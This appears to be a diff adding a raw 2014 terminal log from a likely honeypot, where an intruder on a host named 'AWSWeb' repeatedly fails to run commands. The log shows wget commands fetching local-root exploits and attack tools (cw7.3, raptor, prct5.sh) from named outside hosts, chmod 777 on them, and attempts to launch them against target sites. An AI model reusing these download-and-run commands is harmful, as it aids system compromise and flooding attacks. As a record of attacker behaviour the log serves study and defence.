@@ -1,0 +1,221 @@
+[4hAWSWeb:~# netstat
+bash: netstat: command not found
+AWSWeb:~# yum install qcc
+bash: yum: command not found
+AWSWeb:~# [Kyum install qcc[1D[1P[1D[1P[1D[1Pgcc
+bash: yum: command not found
+AWSWeb:~# status
+bash: status: command not found
+AWSWeb:~# c[1D[1Pl
+bash: l: command not found
+AWSWeb:~# ping google.com
+[4lPING google.com (29.89.32.244) 56(84) bytes of data.
+64 bytes from google.com (29.89.32.244): icmp_seq=1 ttl=50 time=43.3 ms
+64 bytes from google.com (29.89.32.244): icmp_seq=2 ttl=50 time=49.8 ms
+64 bytes from google.com (29.89.32.244): icmp_seq=3 ttl=50 time=46.7 ms
+64 bytes from google.com (29.89.32.244): icmp_seq=4 ttl=50 time=44.1 ms
+64 bytes from google.com (29.89.32.244): icmp_seq=5 ttl=50 time=46.1 ms
+--- google.com ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 907ms
+rtt min/avg/max/mdev = 48.264/50.352/52.441/2.100 ms
+[4hAWSWeb:~# wget x-legend.org/
+[4l--2014-07-20 00:46:52--  http://x-legend.org/
+Connecting to x-legend.org:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'x-legend.org' not found: [Errno -2] Name or service not known.
+[4hAWSWeb:~# [Kwget x-legend.org/cw7.3
+[4l--2014-07-20 00:47:09--  http://x-legend.org/cw7.3
+Connecting to x-legend.org:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'x-legend.org' not found: [Errno -2] Name or service not known.
+[4hAWSWeb:~# [Kwget x-legend.org/cw7.3[23D[K[Kwget x-legend.org/cw7.3
+[4l--2014-07-20 00:47:44--  http://x-legend.org/cw7.3
+Connecting to x-legend.org:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'x-legend.org' not found: [Errno -2] Name or service not known.
+[4hAWSWeb:~# wget http://conficker.web.id/auto/cw7.3
+[4l--2014-07-20 00:48:53--  http://conficker.web.id/auto/cw7.3
+Connecting to conficker.web.id:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'conficker.web.id' not found: [Errno -2] Name or service not known.
+[4hAWSWeb:~# wget http://www.baributz.com/localroot/cw7.3
+[4l--2014-07-20 00:49:31--  http://www.baributz.com/localroot/cw7.3
+Connecting to www.baributz.com:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'www.baributz.com' not found: [Errno -2] Name or service not known.
+[4hAWSWeb:~# wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/cw7.3
+[4l--2014-07-20 00:50:10--  http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/cw7.3
+Connecting to www.bl4ck-viper.persiangig.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3442 (3K) [text/html; charset=utf-8]
+Saving to: `cw7.3
+
+100% [=======================================>] 3,442        16K/s  eta 0s100%[======================================>] 3,442        16K/s
+
+2014-07-20 00:50:10 (16 KB/s) - `cw7.3' saved [3442/3442]
+[4hAWSWeb:~# chmod 777 cw7.3
+[4l[4hAWSWeb:~# [Kchmod 777 cw7.3 [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P./cw7.3F http://thebiguglywebsite.com/
+bash: ./cw7.3F: command not found
+AWSWeb:~# [K./cw7.3F http://thebiguglywebsite.com/[38D[1P
+bash: /cw7.3F: command not found
+AWSWeb:~# [K/cw7.3F http://thebiguglywebsite.com/[37D[1P
+bash: cw7.3F: command not found
+AWSWeb:~# [Kcw7.3F http://thebiguglywebsite.com/ 10
+bash: cw7.3F: command not found
+AWSWeb:~# [Kcw7.3F http://thebiguglywebsite.com/ 10[39D./
+bash: ./cw7.3F: command not found
+AWSWeb:~# [K./cw7.3F http://thebiguglywebsite.com/ 10[41D[Kcw7.3F http://thebiguglywebsite.com/ 10[39D[Kcw7.3F http://thebiguglywebsite.com/[36D[K/cw7.3F http://thebiguglywebsite.com/[37D[K./cw7.3F http://thebiguglywebsite.com/[38D[Kchmod 777 cw7.3
+[4l[4hAWSWeb:~# [Kchmod 777 cw7.3[15D[K./cw7.3F http://thebiguglywebsite.com/ 10
+bash: ./cw7.3F: command not found
+AWSWeb:~# [K./cw7.3F http://thebiguglywebsite.com/ 10[41D[1P
+bash: /cw7.3F: command not found
+AWSWeb:~# [K/cw7.3F http://thebiguglywebsite.com/ 10[40D[1P
+bash: cw7.3F: command not found
+AWSWeb:~# [Kcw7.3F http://thebiguglywebsite.com/ 10[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1C[1D[1P[5D./
+bash: ./cw7.3: command not found
+AWSWeb:~# [K./cw7.3 http://thebiguglywebsite.com/ 10[40D[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pww[1D[1P[1D[1P www.t
+bash: ./cw7.3: command not found
+AWSWeb:~# [K./cw7.3 www.thebiguglywebsite.com/ 10[37D[K./cw7.3 http://thebiguglywebsite.com/ 10[40D[Kcw7.3F http://thebiguglywebsite.com/ 10[39D[K/cw7.3F http://thebiguglywebsite.com/ 10[40D[K./cw7.3F http://thebiguglywebsite.com/ 10[41D[Kchmod 777 cw7.3[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1D[1D./
+[4l[4hAWSWeb:~# [Kchmod 777 ./cw7.3[17D[K./cw7.3 www.thebiguglywebsite.com/ 10
+bash: ./cw7.3: command not found
+AWSWeb:~# [K./cw7.3 www.thebiguglywebsite.com/ 10[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P27.[1D[1P[1D[1P[1D[1P 192.168.1.1
+bash: ./cw7.3: command not found
+AWSWeb:~# [K./cw7.3 192.168.1.1[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pgoogle.com
+bash: ./cw7.3: command not found
+AWSWeb:~# [K./cw7.3 google.com[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P 189.1.172.194[1D[1P4
+bash: ./cw7.3: command not found
+AWSWeb:~# pr[1D[1Perls slap.pll
+bash: perls: command not found
+AWSWeb:~# [Kperls slap.pll[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pl slap.pl
+bash: perl: command not found
+AWSWeb:~# wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/raptor
+[4l--2014-07-20 00:59:53--  http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/raptor
+Connecting to www.bl4ck-viper.persiangig.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3442 (3K) [text/html; charset=utf-8]
+Saving to: `raptor
+
+100% [=======================================>] 3,442        25K/s  eta 0s100%[======================================>] 3,442        25K/s
+
+2014-07-20 00:59:53 (25 KB/s) - `raptor' saved [3442/3442]
+[4hAWSWeb:~# chmod 777 raptor
+[4l[4hAWSWeb:~# ./raptor
+bash: ./raptor: command not found
+AWSWeb:~# ./raptor lol.com
+bash: ./raptor: command not found
+AWSWeb:~# [K./raptor lol.com[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pwww.google.com
+bash: ./raptor: command not found
+AWSWeb:~# cd /tmp;mkdir 2.6.x
+[4l[4h[4l[4hAWSWeb:/tmp# chmod 777 2.6
+[4l[4hAWSWeb:/tmp# cd 2.6[6D[Kchmod 777 2.6.x
+[4l[4hAWSWeb:/tmp# [Kchmod 777 2.6.x[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd 2.6.x
+[4l[4hAWSWeb:/tmp/2.6.x# wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/prct5.sh
+[4l--2014-07-20 01:01:09--  http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/prct5.sh
+Connecting to www.bl4ck-viper.persiangig.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3442 (3K) [text/html; charset=utf-8]
+Saving to: `prct5.sh
+
+100% [=======================================>] 3,442        27K/s  eta 0s100%[======================================>] 3,442        27K/s
+
+2014-07-20 01:01:09 (27 KB/s) - `prct5.sh' saved [3442/3442]
+[4hAWSWeb:/tmp/2.6.x# chmod 777 prct5
+[4l[4hAWSWeb:/tmp/2.6.x# ./prct5.sh lol
+bash: ./prct5.sh: command not found
+AWSWeb:/tmp/2.6.x# [K./prct5.sh lol[1D[1P[1D[1P[1D[1P
+bash: ./prct5.sh: command not found
+AWSWeb:/tmp/2.6.x# [K./prct5.sh 10
+bash: ./prct5.sh: command not found
+AWSWeb:/tmp/2.6.x# cd /tmp;mkdir 2.6.x
+[4l[4h[4lmkdir: cannot create directory `/tmp/2.6.x': File exists
+[4hAWSWeb:/tmp# cd [3D[Kcd /tmp;mkdir 2.6.x[19D[K./prct5.sh 10[13D[Kcd /tmp;mkdir 2.6.x[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[7D[K./prct5.sh 10[13D[K./prct5.sh [11D[K./prct5.sh lol[14D[Kchmod 777 prct5[15D[Kwget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/prct5.sh[71D[Kcd 2.6.x[8D[Kchmod 777 2.6.x[15D[Kcd 2.6[6D[Kchmod 777 2.6[13D[Kcd /tmp;mkdir 2.6.x[19D[Kchmod 777 2.6[13D[Kcd 2.6[6D[Kchmod 777 2.6.x[15D[Kcd 2.6.x[8D[Kwget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/prct5.sh[71D[Kchmod 777 prct5[15D[K./prct5.sh lol[14D[K./prct5.sh [11D[K./prct5.sh 10[13D[Kcd /tmp;mkdir 2.6.x[19D[Kcd [3D[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kcd 2.6.x
+[4l[4hAWSWeb:/tmp/2.6.x# wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/cw7.3
+[4l--2014-07-20 01:02:30--  http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/cw7.3
+Connecting to www.bl4ck-viper.persiangig.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3442 (3K) [text/html; charset=utf-8]
+Saving to: `cw7.3
+
+33% [============>                          ] 1,140        9K/s  eta 0s100%[======================================>] 3,442        9K/s
+
+2014-07-20 01:02:30 (9 KB/s) - `cw7.3' saved [3442/3442]
+[4hAWSWeb:/tmp/2.6.x# chmod 777 cw7.3
+[4l[4hAWSWeb:/tmp/2.6.x# ./cw7.3 ht[1D[1P[1D[1P[1D[1P wwwww[1D[1P[1D[1P.google.com
+bash: ./cw7.3: command not found
+AWSWeb:/tmp/2.6.x# [K./cw7.3 www.google.com[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1D[1P[1D[1P
+bash: cw7.3: command not found
+AWSWeb:/tmp/2.6.x# wget -o /dev/null http://mirror.leaseweb.com/speedtest/10000mb.bin
+[4l--2014-07-20 01:03:49--  http:///dev/null
+Connecting to :80... connected.
+HTTP request sent, awaiting response... Connection was refused by other side: 111: Connection refused.
+[4hAWSWeb:/tmp/2.6.x# wget -o /dev/null http://proof.ovh.net/files/10Gio.dat
+[4l--2014-07-20 01:04:05--  http:///dev/null
+Connecting to :80... connected.
+HTTP request sent, awaiting response... Connection was refused by other side: 111: Connection refused.
+[4hAWSWeb:/tmp/2.6.x#  wget http://cachefly.cachefly.net/100mb.test
+[4l--2014-07-20 01:04:20--  http://cachefly.cachefly.net/100mb.test
+Connecting to cachefly.cachefly.net:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 104857600 (100M) [application/octet-stream]
+Saving to: `100mb.test
+
+ 0% [>                                      ] 3,973        281K/s  eta 6m 12s16% [======>                                ] 17,248,033   33460K/s  eta 2s  33% [============>                          ] 34,728,613   34178K/s  eta 2s49% [===================>                   ] 52,150,793   34383K/s  eta 1s60% [=======================>               ] 63,074,349   31261K/s  eta 1s76% [=============================>         ] 80,524,433   31976K/s  eta 0s86% [=================================>     ] 90,554,305   29819K/s  eta 0s100%[======================================>] 104,857,600  29819K/s
+
+2014-07-20 01:04:23 (29819 KB/s) - `100mb.test' saved [104857600/104857600]
+[4hAWSWeb:/tmp/2.6.x# cd
+[4l[4hAWSWeb:~# cd mkdir [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P /tmp/mkdir lol
+[4lbash: cd: /tmp/mkdir: No such file or directory
+[4hAWSWeb:~# [Kcd /tmp/mkdir lol[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P wget http://cachefly.cachefly.net/100mb.test[53D[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1Pcd
+[4l[4hAWSWeb:~# ping g[1D[1Pwww.googlec[1D[1P.com 200000 100
+[4lPING www.google.com (10.19.123.55) 56(84) bytes of data.
+64 bytes from www.google.com (10.19.123.55): icmp_seq=1 ttl=50 time=46.0 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=2 ttl=50 time=48.9 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=3 ttl=50 time=47.3 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=4 ttl=50 time=40.4 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=5 ttl=50 time=48.3 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=6 ttl=50 time=42.6 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=7 ttl=50 time=42.2 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=8 ttl=50 time=41.2 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=9 ttl=50 time=49.3 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=10 ttl=50 time=44.2 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=11 ttl=50 time=47.2 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=12 ttl=50 time=47.5 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=13 ttl=50 time=42.5 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=14 ttl=50 time=49.1 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=15 ttl=50 time=42.5 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=16 ttl=50 time=40.5 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=17 ttl=50 time=40.3 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=18 ttl=50 time=41.6 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=19 ttl=50 time=41.3 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=20 ttl=50 time=42.1 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=21 ttl=50 time=46.2 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=22 ttl=50 time=49.4 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=23 ttl=50 time=45.7 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=24 ttl=50 time=46.5 ms
+64 bytes from www.google.com (10.19.123.55): icmp_seq=25 ttl=50 time=45.7 ms
+--- www.google.com ping statistics ---
+25 packets transmitted, 25 received, 0% packet loss, time 907ms
+rtt min/avg/max/mdev = 48.264/50.352/52.441/2.100 ms
+[4hAWSWeb:~# status
+bash: status: command not found
+AWSWeb:~# netstat
+bash: netstat: command not found
+AWSWeb:~# net
+bash: net: command not found
+AWSWeb:~# ls
+[4lcw7.3  raptor 
+[4hAWSWeb:~# cd temp
+[4lbash: cd: temp: No such file or directory
+[4hAWSWeb:~# [Kcd temp[1D[1P[1D[1P[1D[1P[1D[1Phome
+[4lbash: cd: home: No such file or directory
+[4hAWSWeb:~# cd /tmp
+[4l[4hAWSWeb:/tmp# ls
+[4l2.6.x 
+[4hAWSWeb:/tmp# status
+bash: status: command not found
+AWSWeb:/tmp# lcp
+bash: lcp: command not found
+AWSWeb:/tmp# help
+bash: help: command not found
+AWSWeb:/tmp# /help
+bash: /help: command not found
+AWSWeb:/tmp# /commands
+bash: /commands: command not found
+AWSWeb:/tmp# !help
+bash: !help: command not found
+AWSWeb:/tmp# 
